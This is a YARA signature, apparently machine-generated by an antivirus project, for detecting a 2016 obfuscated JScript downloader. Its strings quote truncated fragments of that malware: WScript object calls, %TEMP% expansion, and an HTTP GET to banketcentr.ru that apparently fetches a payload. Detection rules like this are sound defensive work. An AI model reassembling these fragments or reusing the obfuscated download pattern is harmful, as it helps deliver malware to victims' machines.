rule sig_20160428_bc875a5223e6f50e6ffc94c66292b24e {
  meta:
    description = "datamaliciousorder - file 20160428_bc875a5223e6f50e6ffc94c66292b24e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5ef350a79dd9b82212ab131d1b7db04eba3e34337cdaa737ea982b47efbf0106"

  strings:
    $s1  = "function XnzXohNdiOuiWblFqlMfy(OrqQayTooKtcMtmPlgFwi){GihFfgLetNvwSctThfRmj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function XnzXohNdiOuiWblFqlMfy(OrqQayTooKtcMtmPlgFwi){GihFfgLetNvwSctThfRmj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function IfmSudPziIroEkfOvdFag() {return GihFfgLetNvwSctThfRmj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function RkjSpvBqaSniSnnLqcGcm(QtwNmaLmeOhzLodBfrAyt, InyPocWqcTjfSxfCyjYzf){EgpKocSxaJxyXgxUqyBmx = EgpKocSxaJxyXgxUqyBmx * 1; " ascii
    $s5  = "return QtwNmaLmeOhzLodBfrAyt - InyPocWqcTjfSxfCyjYzf;};" fullword ascii
    $s6  = "var GihFfgLetNvwSctThfRmj = function AfcOvkYlmWcgTggSlhPrv() {return EnpRqeZtgHylYddAdjDpn[WmgEmeKwgKphCrsDuyHwm](\"WScript\"+\"" ascii
    $s7  = "RdnQbuDeuUaiEgoSehZxx[VqaLmsApkHmeGnrYzqXvi](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s8  = "var EnpRqeZtgHylYddAdjDpn = this[\"WScript\"];" fullword ascii
    $s9  = "var GihFfgLetNvwSctThfRmj = function AfcOvkYlmWcgTggSlhPrv() {return EnpRqeZtgHylYddAdjDpn[WmgEmeKwgKphCrsDuyHwm](\"WScript\"+\"" ascii
    $s10 = "function IfmSudPziIroEkfOvdFag() {return GihFfgLetNvwSctThfRmj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (RdnQbuDeuUaiEgoSehZxx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function RkjSpvBqaSniSnnLqcGcm(QtwNmaLmeOhzLodBfrAyt, InyPocWqcTjfSxfCyjYzf){EgpKocSxaJxyXgxUqyBmx = EgpKocSxaJxyXgxUqyBmx * 1; " ascii
    $s13 = "function PvpAfbHyuZizKjjQdsUyd(){return TmsBaxOuzXidBbrVruWme + \"\";};" fullword ascii
    $s14 = "function NacUhcTyxMugGuaUseLhr() {return ((JrbObrBefHpoHbnMhdDle == true) && (JrbObrBefHpoHbnMhdDle == EhqXfjMswMkoRzlSyjKaj)) ?" ascii
    $s15 = "function NacUhcTyxMugGuaUseLhr() {return ((JrbObrBefHpoHbnMhdDle == true) && (JrbObrBefHpoHbnMhdDle == EhqXfjMswMkoRzlSyjKaj)) ?" ascii
    $s16 = "var CdpMsqVilGmtXduQhiQkl = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var ZzfPwqLbbMnvHwdVpnUyj = false;" fullword ascii
    $s18 = "function TkyQghRnwFjsWueMzrOfv(){return 23;};" fullword ascii
    $s19 = "function GdhHwdWwjEraUzbUciFxo(FsnKhcGohCbaRtpIivMqy) {var XqdGgoSfmBdsUtyIjuSvl = (1, 2, 3, 4, 5, FsnKhcGohCbaRtpIivMqy); retur" ascii
    $s20 = "return RkjSpvBqaSniSnnLqcGcm(1 == 1 ? PjqTmzCltGnkYzeTnkMpx : 0, 1 == 1 ? ChnMvjHjzWinKfaEjePsn : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}